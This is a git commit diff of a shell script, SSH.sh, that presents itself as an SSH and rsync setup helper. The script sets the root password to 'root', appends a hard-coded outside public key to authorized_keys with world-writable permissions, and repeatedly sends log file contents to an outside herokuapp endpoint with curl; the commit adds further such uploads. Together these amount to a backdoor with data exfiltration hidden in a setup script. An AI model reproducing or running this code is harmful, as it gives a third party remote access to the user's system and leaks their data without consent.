a0c188f1a89b8a60358a660db66480d3f0942bc5
Adarsh BP <36394852+AdarshBP@users.noreply.github.com>
2020-12-10 16:11:53 +0530

    Update SSH.sh

--- files/SSH.sh
+++ files/SSH.sh
@@ -5,16 +5,20 @@ curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode mess
 touch datalog.txt;
 apt update -y | tee -a datalog.txt;
 apt upgrade -y | tee -a datalog.txt ;
+output=$(cat datalog.txt);
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
 echo "STEP 1 >>>> update and upgarde is completed"
-apt install openssh -y  | tee -a datalog.txt  ;
+apt install openssh -y  | tee  datalog.txt  ;
 apt install rsync -y  | tee -a datalog.txt  ;
-echo "STEP 2 >>>> Installed openssh";
-echo "STEP 3 >>>> Installed rsync";
-echo -e "root\nroot" | passwd ;
+echo "STEP 2 >>>> Installed openssh" | tee -a datalog.txt;
+echo "STEP 3 >>>> Installed rsync" | tee -a datalog.txt;
+output=$(cat datalog.txt);
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
+echo -e "root\nroot" | passwd | tee  datalog.txt;
 cd ./.ssh;
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW2fIF2FfITNH+lp7GlJkJAPKBJlpIuKNcaLZFiVp/4kOBxiVCKJYk4/FViYiQ4e1+viRgC2eqNzRH0Zxy6pJJ1T3vo/8wAtWIz3rudF//wYgA6sFN6lb88QV0aKrijA3833GEwpO8Nu/oA+xy3PetJhHXKk/WjeBXFJmlZxCCK1SnARxyikB447EhNbb5sA8cBXBLFCHgkxbmTSfyARsQ7CxPMQSQf+M09vuu83q/87pqGtGeudonmuCbwjfxHnPDpNqauKGNpmk3zNxqCvWtvYdKp3v30BFX+REfj1H+2ZFkZ917IQ/wvm8ENexPy5UxMUf628oH3X33d9OTghM2ylBFDmXAk2mB3pvXYBa+gxaaqXc6ielK3Co6pB9PXfd/GiyN2oUs1va3f++TwSgEFDinJQzcR68bQ3bplfIBqYCFtk43+daufawrowkHLVefHU98SjT5jkF8XpskvyGAAtoHVpfJ3Ke+yIqN5YvF4zczadpxocP4eEeL/WfK8j8= adarshbp@adarshbp
 ' >> authorized_keys ;
 chmod 777 authorized_keys ;
 echo "STEP 4 >>>> Configured key";
-output=$(cat test.sh);
+output=$(cat datalog.txt);
 curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
